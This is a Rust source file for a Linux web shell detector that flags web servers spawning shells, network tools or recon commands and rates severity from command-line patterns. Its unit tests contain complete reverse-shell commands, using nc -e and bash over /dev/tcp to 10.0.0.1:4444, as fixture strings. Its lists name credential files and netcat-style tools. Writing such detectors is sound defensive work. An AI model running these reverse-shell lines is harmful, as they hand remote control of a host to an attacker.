//! Web shell detection via parent/child process relationships.
//!
//! Detects cases where a web server or application server spawns a shell or
//! scripting interpreter, which is a strong indicator of web shell / RCE.
//!
//! MITRE ATT&CK: T1505.003 (Server Software Component: Web Shell)

use lazy_static::lazy_static;
use std::collections::HashSet;

lazy_static! {
    /// Web server and common application server parent processes.
    static ref WEB_SERVER_PARENTS: HashSet<&'static str> = {
        let mut set = HashSet::new();
        // Apache variants
        set.insert("apache2");
        set.insert("httpd");
        set.insert("apache");
        // Nginx
        set.insert("nginx");
        // Other web servers / reverse proxies
        set.insert("lighttpd");
        set.insert("caddy");
        // App servers and runtimes
        set.insert("tomcat");
        set.insert("java");
        set.insert("node");
        set.insert("nodejs");
        set.insert("php-fpm");
        set.insert("php-cgi");
        set.insert("php");
        set.insert("gunicorn");
        set.insert("uwsgi");
        set.insert("unicorn");
        set.insert("puma");
        set.insert("passenger");
        set.insert("python");
        set.insert("python3");
        set
    };

    /// Shells and tools that are suspicious when spawned by a web server.
    static ref SUSPICIOUS_CHILDREN: HashSet<&'static str> = {
        let mut set = HashSet::new();
        // Shells
        set.insert("sh");
        set.insert("bash");
        set.insert("dash");
        set.insert("zsh");
        set.insert("fish");
        set.insert("ksh");
        set.insert("csh");
        set.insert("tcsh");
        // Scripting interpreters
        set.insert("python");
        set.insert("python3");
        set.insert("perl");
        set.insert("ruby");
        set.insert("php");
        set.insert("lua");
        // Network tools commonly used post-exploitation
        set.insert("nc");
        set.insert("ncat");
        set.insert("netcat");
        set.insert("socat");
        set.insert("curl");
        set.insert("wget");
        // Recon
        set.insert("whoami");
        set.insert("id");
        set.insert("uname");
        set.insert("hostname");
        set.insert("ifconfig");
        set.insert("ip");
        set.insert("cat");
        set.insert("ls");
        set.insert("ps");
        set.insert("env");
        set
    };
}

/// Command substrings that are always high-risk in a web execution context.
const ALWAYS_SUSPICIOUS_COMMANDS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    ".ssh/",
    "authorized_keys",
    "/proc/",
    "nc -e",
    "bash -i",
    "/dev/tcp/",
    "base64 -d",
    "eval(",
    "exec(",
    "shell_exec",
];

#[derive(Debug, Clone)]
pub struct WebShellIndicator {
    pub parent_process: String,
    pub child_process: String,
    pub cmdline: String,
    pub severity: Severity,
    pub confidence: Confidence,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Critical,
    High,
    Medium,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    High,
    Medium,
    Low,
}

/// Check if a parent-child relationship indicates web shell activity.
pub fn check_webshell_spawn(
    parent_name: &str,
    child_name: &str,
    child_cmdline: &str,
) -> Option<WebShellIndicator> {
    let parent_lower = parent_name.to_lowercase();
    let child_lower = child_name.to_lowercase();

    let is_web_parent = WEB_SERVER_PARENTS.iter().any(|&p| parent_lower.contains(p));
    if !is_web_parent {
        return None;
    }

    let is_suspicious_child = SUSPICIOUS_CHILDREN
        .iter()
        .any(|&c| child_lower == c || child_lower.ends_with(&format!("/{}", c)));
    if !is_suspicious_child {
        return None;
    }

    let (severity, confidence) = analyze_cmdline_risk(child_cmdline);

    Some(WebShellIndicator {
        parent_process: parent_name.to_string(),
        child_process: child_name.to_string(),
        cmdline: child_cmdline.to_string(),
        severity,
        confidence,
    })
}

fn analyze_cmdline_risk(cmdline: &str) -> (Severity, Confidence) {
    let lower = cmdline.to_lowercase();

    for needle in ALWAYS_SUSPICIOUS_COMMANDS {
        if lower.contains(needle) {
            return (Severity::Critical, Confidence::High);
        }
    }

    if lower.contains("/dev/tcp")
        || lower.contains("nc -e")
        || lower.contains("bash -i")
        || (lower.contains("socket") && lower.contains("connect"))
    {
        return (Severity::Critical, Confidence::High);
    }

    if lower.contains("base64") || lower.contains("eval") || lower.contains("\\x") {
        return (Severity::High, Confidence::High);
    }

    (Severity::Medium, Confidence::Medium)
}

/// Resolve the parent process comm name via procfs (Linux-only).
pub fn get_parent_process_name(pid: u32) -> Option<String> {
    let stat_path = format!("/proc/{}/stat", pid);
    let stat = std::fs::read_to_string(&stat_path).ok()?;
    let close_paren = stat.rfind(')')?;
    let after_comm = &stat[close_paren + 2..];
    let fields: Vec<&str> = after_comm.split_whitespace().collect();
    let ppid: u32 = fields.get(1)?.parse().ok()?;

    let comm_path = format!("/proc/{}/comm", ppid);
    std::fs::read_to_string(&comm_path)
        .ok()
        .map(|s| s.trim().to_string())
}

pub fn check_process_for_webshell(
    pid: u32,
    process_name: &str,
    cmdline: &str,
) -> Option<WebShellIndicator> {
    let parent_name = get_parent_process_name(pid)?;
    check_webshell_spawn(&parent_name, process_name, cmdline)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_apache_spawning_bash() {
        let result = check_webshell_spawn("apache2", "bash", "bash -c 'id'");
        assert!(result.is_some());
        let indicator = result.unwrap();
        assert_eq!(indicator.parent_process, "apache2");
        assert_eq!(indicator.child_process, "bash");
    }

    #[test]
    fn test_nginx_spawning_nc() {
        let result = check_webshell_spawn("nginx", "nc", "nc -e /bin/sh 10.0.0.1 4444");
        assert!(result.is_some());
        let indicator = result.unwrap();
        assert!(matches!(indicator.severity, Severity::Critical));
        assert!(matches!(indicator.confidence, Confidence::High));
    }

    #[test]
    fn test_php_fpm_reverse_shell() {
        let result =
            check_webshell_spawn("php-fpm", "bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(result.is_some());
        assert!(matches!(result.unwrap().severity, Severity::Critical));
    }

    #[test]
    fn test_java_spawning_whoami() {
        let result = check_webshell_spawn("java", "whoami", "whoami");
        assert!(result.is_some());
        assert!(matches!(result.unwrap().severity, Severity::Medium));
    }

    #[test]
    fn test_normal_process_not_flagged() {
        let result = check_webshell_spawn("systemd", "bash", "bash");
        assert!(result.is_none());

        let result = check_webshell_spawn("bash", "ls", "ls -la");
        assert!(result.is_none());
    }

    #[test]
    fn test_passwd_access_critical() {
        let result = check_webshell_spawn("nginx", "cat", "cat /etc/passwd");
        assert!(result.is_some());
        assert!(matches!(result.unwrap().severity, Severity::Critical));
    }
}
